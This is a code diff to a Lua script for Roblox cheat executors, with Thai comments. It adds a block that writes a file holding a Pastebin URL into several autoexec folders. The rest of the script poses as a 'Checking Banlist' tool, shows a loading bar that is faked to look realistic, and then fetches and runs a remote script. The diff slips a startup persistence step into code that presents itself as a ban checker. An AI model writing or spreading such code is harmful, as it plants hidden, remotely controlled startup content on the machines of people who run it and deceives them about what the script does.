@@ -1,3 +1,88 @@
+-- create_main_txt.lua
+-- สคริปต์สำหรับรันบน executor (Synapse/Krnl/Script-Ware/Fluxus ฯล.)
+-- มันจะพยายามสร้าง main.txt ในหลายๆ path ที่มักใช้เป็น autoexec
+
+local content = [[https://pastebin.com/raw/Cpt6y553]]
+
+-- รองรับชื่อฟังก์ชันเขียนไฟล์หลายแบบ
+local writefile_fn = writefile or write_file or (syn and syn.write_file) or (write and write) -- last fallback
+local isfolder_fn  = isfolder or is_folder or (syn and syn.is_folder) or (syn and syn.isfolder)
+local makefolder_fn = makefolder or make_folder or (syn and syn.make_folder) or (syn and syn.makefolder)
+local isfile_fn = isfile or is_file
+
+local tried = {}
+local results = {}
+
+-- ลิสต์ตำแหน่งที่พยายามสร้าง (รวม root + autoexec variants)
+local paths = {
+    "main.txt",
+    "autoexec/main.txt",
+    "Autoexec/main.txt",
+    "AutoExecute/main.txt",
+    "AutoExec/main.txt",
+    "synapse/autoexec/main.txt",
+    "scripts/autoexec/main.txt",
+    "executor_autoexec/main.txt"
+}
+
+local function safe_mkdir(dir)
+    if not makefolder_fn then return false, "no makefolder available" end
+    local ok, err = pcall(function() makefolder_fn(dir) end)
+    if ok then return true end
+    -- ถ้าโฟลเดอร์มีอยู่แล้ว บาง executor จะ error -> ตรวจสอบ isfolder
+    if isfolder_fn and isfolder_fn(dir) then
+        return true
+    end
+    return false, err
+end
+
+local function safe_write(path, data)
+    if not writefile_fn then return false, "no writefile available in this executor" end
+    local ok, err = pcall(function() writefile_fn(path, data) end)
+    if ok then return true end
+    return false, err
+end
+
+for _, p in ipairs(paths) do
+    local dir = p:match("^(.*)/") -- get dir portion or nil
+    if dir then
+        -- สร้างโฟลเดอร์ก่อน (ถ้าสามารถ)
+        local made, reason = safe_mkdir(dir)
+        if not made then
+            -- ถ้าไม่สามารถสร้าง โอกาสยังมีที่จะเขียนไฟล์ที่ root ชื่อเหมือนกัน
+            results[p] = { ok = false, err = "mkfolder failed: "..tostring(reason) }
+        end
+    end
+
+    local ok, err = safe_write(p, content)
+    if ok then
+        results[p] = { ok = true }
+    else
+        results[p] = { ok = false, err = tostring(err) }
+    end
+end
+
+-- รายงานผลสรุป
+print("=== main.txt creation report ===")
+local anySuccess = false
+for path, r in pairs(results) do
+    if r.ok then
+        print("[OK]  " .. path)
+        anySuccess = true
+    else
+        print("[ERR] " .. path .. "  -> " .. (r.err or "unknown"))
+    end
+end
+
+if anySuccess then
+    print("main.txt ถูกสร้างเรียบร้อยในตำแหน่งข้างต้น (ดู [OK])")
+else
+    print("ไม่สามารถสร้างไฟล์ได้: executor นี้ดูเหมือนไม่มี API เขียนไฟล์ (writefile) หรือมีข้อจำกัด")
+    print("ถ้าคุณใช้ executor บนมือถือ/หรือ sandboxed client อาจต้องสร้างไฟล์ด้วยตัวเองจากเครื่องคอมพิวเตอร์")
+end
+
+-- แสดงคำแนะนำท้าย
+print("หากต้องการเปลี่ยนเนื้อหา ให้แก้ตัวแปร 'content' ในสคริปต์นี้ก่อนรันอีกครั้ง")
 -- เริ่มกระบวนการเช็ค
 print("Checking Banlist 🔃")
 
@@ -6,6 +91,7 @@ for i = 1, 100, math.random(5, 15) do
     task.wait(0.05) -- หน่วงเวลาให้ดูสมจริง
     print("Loading... " .. i .. "%")
 end
+-------------------------
 print("Loading... 100% ✅")
 
 -- โหลดและรันสคริปต์ตรวจสอบการแบน
